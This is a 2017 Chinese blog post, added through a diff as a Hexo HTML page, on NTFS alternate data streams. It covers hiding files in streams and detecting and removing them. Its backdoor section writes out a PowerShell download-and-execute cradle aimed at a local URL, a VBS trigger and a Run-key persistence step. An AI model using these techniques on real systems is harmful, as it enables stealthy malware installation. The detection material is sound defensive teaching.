@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="今天偶然间看到的，查了一下虽然不是什么新鲜的东西，但着实让我吃了一惊。 以下内容多数摘自网络。 什么是NTFS交换数据流（ADS）NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无">
+<meta name="keywords" content="NTFS,脑洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="脑洞大开 - NTFS交换数据流ADS">
+<meta property="og:url" content="https://veritas501.github.io/2017/03/04/脑洞大开 - NTFS交换数据流ADS/index.html">
+<meta property="og:site_name" content="Veritas501&#39;s Blog">
+<meta property="og:description" content="今天偶然间看到的，查了一下虽然不是什么新鲜的东西，但着实让我吃了一惊。 以下内容多数摘自网络。 什么是NTFS交换数据流（ADS）NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_501120d30a03d1e79c32bb4ef3af93cc.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_633903e3c0be74d2d9769d7c69a00d9b.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_d056145f950b2bcbe27985095c0306f0.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_2219a33b8f21a9ba436ca49b23674e06.png">
+<meta property="og:image" content="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_f1ccdf856183594d98163a86f6e0d312.png">
+<meta property="og:updated_time" content="2017-08-25T06:12:50.908Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="脑洞大开 - NTFS交换数据流ADS">
+<meta name="twitter:description" content="今天偶然间看到的，查了一下虽然不是什么新鲜的东西，但着实让我吃了一惊。 以下内容多数摘自网络。 什么是NTFS交换数据流（ADS）NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无">
+<meta name="twitter:image" content="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_501120d30a03d1e79c32bb4ef3af93cc.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://veritas501.github.io/2017/03/04/脑洞大开 - NTFS交换数据流ADS/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>脑洞大开 - NTFS交换数据流ADS | Veritas501's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Veritas501's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-guestbook">
+    <a href="/Guestbook" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-pencil"></i> <br />guestbook</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://veritas501.github.io/2017/03/04/脑洞大开 - NTFS交换数据流ADS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Veritas501">
+      <meta itemprop="description" content="开始踏上Re&Pwn之路...">
+      <meta itemprop="image" content="/images/215.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Veritas501's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">脑洞大开 - NTFS交换数据流ADS
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-03-04 00:00:00" itemprop="dateCreated datePublished" datetime="2017-03-04T00:00:00+08:00">2017-03-04</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2017-08-25 14:12:50" itemprop="dateModified" datetime="2017-08-25T14:12:50+08:00">2017-08-25</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/03/04/脑洞大开 - NTFS交换数据流ADS/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">Comments: </span> <span class="post-comments-count valine-comment-count" data-xid="/2017/03/04/脑洞大开 - NTFS交换数据流ADS/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/03/04/脑洞大开 - NTFS交换数据流ADS/" class="leancloud_visitors" data-flag-title="脑洞大开 - NTFS交换数据流ADS">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>今天偶然间看到的，查了一下虽然不是什么新鲜的东西，但着实让我吃了一惊。</p>
+<p>以下内容多数摘自网络。</p>
+<h2 id="什么是NTFS交换数据流（ADS）"><a href="#什么是NTFS交换数据流（ADS）" class="headerlink" title="什么是NTFS交换数据流（ADS）"></a>什么是NTFS交换数据流（ADS）</h2><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。</p>
+<p><strong>以下一段摘自FreeBuf：</strong></p>
+<p>举个例子，我现在有一个文本文件，名称为test.txt，文本内容为”Hello, world!”。其MFT记录结构如图：</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_501120d30a03d1e79c32bb4ef3af93cc.png" alt=""></p>
+<p>\$FILE_NAME属性包含了该文件名test.txt。 \$DATA属性则包含了内容 “Hello, world!”。这里说个题外话，由于该内容长度小于1kb，所以文件的内容就直接存储在MFT记录里面了（称为resident）。如果内容长度大于1kb，文件内容会被存储在别的地方 （称为non-resident），在这种情况下$DATA属性只包含其存储地址。这里“Hello, world!”很短，所以直接保存在了MFT记录里面。</p>
+<p>很多人想当然的认为一个文件只能有一个\$DATA属性，这是错误的。在NTFS中，一个文件可以有多个\$DATA属性。比如我现在想给test.txt加入一个名为ThisIsAnADS的$DATA属性：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Hello, freebuf! &gt; test.txt:ThisIsAnADS</span><br></pre></td></tr></table></figure>
+<p>那么，该文件的MFT记录就变成了下图所示:</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_633903e3c0be74d2d9769d7c69a00d9b.png" alt=""></p>
+<p>你可能发现了这两个\$DATA属性还是略有不同的，第一个没有名称，而第二个有名称（ThisIsAnADS）！通常人们称第一个为主数据流（primary data stream ）。主数据流在文件创建的同时就被创建了，并且默认没有名称，所以也叫做未名数据流 （unnamed data stream）。第二个是我们后来创建的，并且赋予了名称（ThisIsAnADS）。这个就是供选数据流 （alternate data stream，ADS）。绝大多数用户只会和主数据流打交道，从某种意义上来说，ADS对用户是隐藏的。用常规的dir命令和windows文件管理器都没法发现ADS。而当我们查看文件内容的时候也仅仅显示主数据流的内容。</p>
+<h2 id="NTFS交换数据流隐藏文件实例"><a href="#NTFS交换数据流隐藏文件实例" class="headerlink" title="NTFS交换数据流隐藏文件实例"></a>NTFS交换数据流隐藏文件实例</h2><h3 id="隐藏文本"><a href="#隐藏文本" class="headerlink" title="隐藏文本"></a>隐藏文本</h3><p>在命令行下，我们敲：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 666666&gt;&gt;suzhu.txt:stream.txt</span><br></pre></td></tr></table></figure></p>
+<p>这里的<code>suzhu.txt</code>可以是目前不存在的文件，也可以是现有的文件。如果我们敲命令之前没有<code>suzhu.txt</code>，那么我们的文件夹下就多出了一个叫<code>suzhu.txt</code>的空白文件。</p>
+<p>查看我们的写入的文本也简单，敲命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad suzhu.txt:stream.txt</span><br></pre></td></tr></table></figure></p>
+<p>删除文件也简单，直接把<code>suzhu.txt</code>删掉，寄生的<code>stream.txt</code>也被删掉了。</p>
+<p>此处注意，如果我们当时创建流文件时敲的是：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 666666&gt;&gt;:stream.txt</span><br></pre></td></tr></table></figure></p>
+<p>那当我们需要删除这个文件的时候只能把这整个文件夹删除。</p>
+<p><strong>P.S.</strong>另外，网上说此时我们可以敲<code>notepad YOUR_FOLDER\:stream.txt</code>打开这个流文件，但我没有成功。</p>
+<h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>和上面差不多，我们以一张20MB，名字为aaa.jpg的图片为例。</p>
+<p>我们敲命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> aaa.jpg&gt;&gt;suzhu.txt:aaa.jpg</span><br></pre></td></tr></table></figure></p>
+<p>删掉原来的<code>aaa.jpg</code>，我们多了一个叫<code>suzhu.txt</code>的空文件。右键查看这个空文件的属性，发现文件的大小为0字节，但占用空间为20MB，说明交换数据流还是会占空间的。</p>
+<p>我们用画板打开这张图片：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mspaint suzhu.txt:aaa.jpg</span><br></pre></td></tr></table></figure></p>
+<p>删除文件方法同上。</p>
+<h3 id="隐藏后门（此段来自FreeBuf）"><a href="#隐藏后门（此段来自FreeBuf）" class="headerlink" title="隐藏后门（此段来自FreeBuf）"></a>隐藏后门（此段来自FreeBuf）</h3><p>既然ADS不被大多数用户所知，而且常规的系统命令和文件管理器都检查不到其存在，那么我们可以把后门放在ADS以起到隐藏的目的。让我们先试着把netcat的二进制内容存到test.txt的一个叫nc.exe的ADS里面：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> nc.exe &gt; test.txt:nc.exe</span><br></pre></td></tr></table></figure></p>
+<p>可以写入，没有问题。试着执行之:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:\<span class="built_in">test</span>&gt;start test.txt:nc.exe</span><br><span class="line">Access is denied.</span><br></pre></td></tr></table></figure></p>
+<p>但是执行不成功。。。因为从windows xp以后微软就禁止用户从ADS里执行程序了。写入，读出操作都可以，但是不允许执行。</p>
+<p>换一个思路，既然允许写和读，那么我们可以在ADS里面写入脚本，然后用脚本解释器(Wscript.exe)来运行该脚本。Wscript.exe默认支持js, vbs等，但是我更偏爱powershell的简单高效。所以准备在一个文件中写入2个ADS，一个包含powershell脚本后门，用于从网上下载和执行恶意脚本。一个包含VBS脚本，用于触发powershell脚本。具体设计如下图，包括3部分:</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_d056145f950b2bcbe27985095c0306f0.png" alt=""></p>
+<ol>
+<li><p>恶意脚本：一个提供真正的恶意功能的powershell脚本，比如反弹cmd shell等等，具体如何用powershell实现远控功能，请参照<a href="https://github.com/mattifestation/PowerSploit。" target="_blank" rel="noopener">https://github.com/mattifestation/PowerSploit。</a> 这里为了演示的目的，我们的”恶意脚本”只会弹出一个对话框，显示”Infected”。该文件名为malware.ps1，存放于 <a href="http://127.0.0.1:8123/malware.ps1" target="_blank" rel="noopener">http://127.0.0.1:8123/malware.ps1</a></p>
+</li>
+<li><p>下载器：该下载器也是一段powershell脚本，用来下载并执行恶意脚本。其实就一句话 “IEX ((New-Object Net.WebClient).DownloadString(&#039;<a href="http://127.0.0.1:8123/malware.ps1&#039;));&quot;" target="_blank" rel="noopener">http://127.0.0.1:8123/malware.ps1&#039;));&quot;</a> 我们把它base64编码[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(“IEX ((New-Object Net.WebClient).DownloadString(&#039;<a href="http://127.0.0.1:8123/malware.ps1&#039;));&quot;))得到base64编码结果。然后把" target="_blank" rel="noopener">http://127.0.0.1:8123/malware.ps1&#039;));&quot;))得到base64编码结果。然后把</a> powershell.exe -ep Bypass -noexit -enc [base64编码结果] 写入test.txt:1</p>
+</li>
+<li><p>触发器：该触发器是一段VB脚本，会开一个cmd运行test.txt:1 里的脚本。由于我们要用wscript.exe 来运行这个ADS, 而wscript.exe会检查脚本文件的后缀名，所以这个ADS的命名必须以.vbs结尾。 具体内容为 Dim objShell:Set objShell = WScript.CreateObject(“WScript.Shell”):command = “cmd /C for /f “”delims=,”” %i in (C:\test\test.txt:1) do %i”:objShell.Run command, 0:Set objShell = Nothing，将其写入test.txt:2.vbs</p>
+</li>
+</ol>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_2219a33b8f21a9ba436ca49b23674e06.png" alt=""></p>
+<p>用wscript.exe运行一下，成功！进程管理器显示该进程名为powershell.exe</p>
+<p><img src="http://ordvwjm69.bkt.clouddn.com/NTFS_ADS_f1ccdf856183594d98163a86f6e0d312.png" alt=""></p>
+<p>当然，还可以把wscript.exe test.txt:2.vbs 放在注册表与自动启动相关的键值里，比如HKCU\Software\Microsoft\Windows\CurrentVersion\Run 等，以实现开机自启动。</p>
+<h2 id="如何检测和清除NTFS-ADS隐藏的文件"><a href="#如何检测和清除NTFS-ADS隐藏的文件" class="headerlink" title="如何检测和清除NTFS-ADS隐藏的文件"></a>如何检测和清除NTFS-ADS隐藏的文件</h2><p>简而言之，用软件。</p>
+<p>下载: <a href="https://pan.baidu.com/s/1qYnTbIW" target="_blank" rel="noopener">https://pan.baidu.com/s/1qYnTbIW</a> 密码: v2bq</p>
+<p>lads.exe:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * 将这lads.exe这个程序放置需要检测的分区根目录中，</span><br><span class="line"> * 不添加任何参数直接运行，就是检测根目录中所有文件，</span><br><span class="line"> * 如果使用&quot;lads.exe test /S&quot;，就是递归检测test以及test下所子目录。</span><br><span class="line"> * 下面这条命令是检测根目录以及所有子目录。</span><br><span class="line"> */</span><br><span class="line">E:\&gt;lads.exe /S</span><br><span class="line"> </span><br><span class="line">Scanning directory E:\ with subdirectories</span><br><span class="line"> </span><br><span class="line">      size  ADS in file</span><br><span class="line">----------  ---------------------------------</span><br><span class="line">        12  E:\:123.txt</span><br><span class="line">    346112  E:\:aaa.exe</span><br><span class="line">    144588  E:\:bbb.jpg</span><br><span class="line">         7  E:\123.txt:222.txt</span><br><span class="line">    346112  E:\123.txt:aaa.exe</span><br><span class="line">     72294  E:\123.txt:bbb.jpg</span><br><span class="line">     72294  E:\aaa.exe:bbb.jpg</span><br><span class="line">        12  E:\test\:123.txt</span><br><span class="line">     72294  E:\test\:bbb.jpg</span><br><span class="line"> </span><br><span class="line">   1053737 bytes in 9 ADS listed</span><br><span class="line"> </span><br><span class="line">/*可以看到我们实验中添加的所有交换数据流一览无遗*/</span><br></pre></td></tr></table></figure></p>
+<p>使用streams.exe这个程序来清除这些交换数据流，根据上面检测的输出信息，我将streams.exe放在E盘的根目录：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 首先尝试清除一下E盘根目录上面寄生的交换数据流，</span></span><br><span class="line"><span class="comment"> * -d后面接目录。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">E:\&gt;streams.exe -d E:\</span><br><span class="line"> </span><br><span class="line">E:\:</span><br><span class="line">   Deleted :<span class="number">123.</span>txt:$DATA</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 这里出现了一个错误，因为这个:aaa.exe现在正在运行</span></span><br><span class="line"><span class="comment"> * 对于这种情况，需要先结束掉这个:aaa.exe进程才能清除。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">   Error deleting :aaa.exe:$DATA:</span><br><span class="line">?????</span><br><span class="line">   Deleted :bbb.jpg:$DATA</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*可以添加-s参数来一次性递归清除E盘下所有寄生的交换数据流文件（慎用，尤其是对系统盘一定不要随便使用递归清除，系统本身的一些数据流也会被一起清除掉）*/</span></span><br><span class="line">E:\&gt;streams.exe -s -d E:\</span><br><span class="line"> </span><br><span class="line">E:\<span class="number">123.</span>txt:</span><br><span class="line">   Deleted :<span class="number">222.</span>txt:$DATA</span><br><span class="line">   Deleted :aaa.exe:$DATA</span><br><span class="line">   Deleted :bbb.jpg:$DATA</span><br><span class="line">E:\aaa.exe:</span><br><span class="line">   Deleted :bbb.jpg:$DATA</span><br><span class="line">E:\test:</span><br><span class="line">   Deleted :<span class="number">123.</span>txt:$DATA</span><br><span class="line">   Deleted :bbb.jpg:$DATA</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Veritas501</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://veritas501.github.io/2017/03/04/脑洞大开 - NTFS交换数据流ADS/" title="脑洞大开 - NTFS交换数据流ADS">https://veritas501.github.io/2017/03/04/脑洞大开 - NTFS交换数据流ADS/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> unless stating additionally.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/NTFS/" rel="tag"># NTFS</a>
+          
+            <a href="/tags/脑洞/" rel="tag"># 脑洞</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/02/南邮CTF平台解题writeup/" rel="next" title="南邮CTF平台 部分writeup">
+                <i class="fa fa-chevron-left"></i> 南邮CTF平台 部分writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/03/04/Reversing.kr writeup/" rel="prev" title="Reversing.kr writeup">
+                Reversing.kr writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/215.png"
+                alt="Veritas501" />
+            
+              <p class="site-author-name" itemprop="name">Veritas501</p>
+              <p class="site-description motion-element" itemprop="description">开始踏上Re&Pwn之路...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">62</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">37</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/veritas501" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="http://music.163.com/#/user/home?id=58295006" target="_blank" title="网易云"><i class="fa fa-fw fa-music"></i>网易云</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/xu-qt/activities" target="_blank" title="知乎"><i class="fa fa-fw fa-quora"></i>知乎</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://osu.ppy.sh/users/9533614" target="_blank" title="OSU"><i class="fa fa-fw fa-headphones"></i>OSU</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
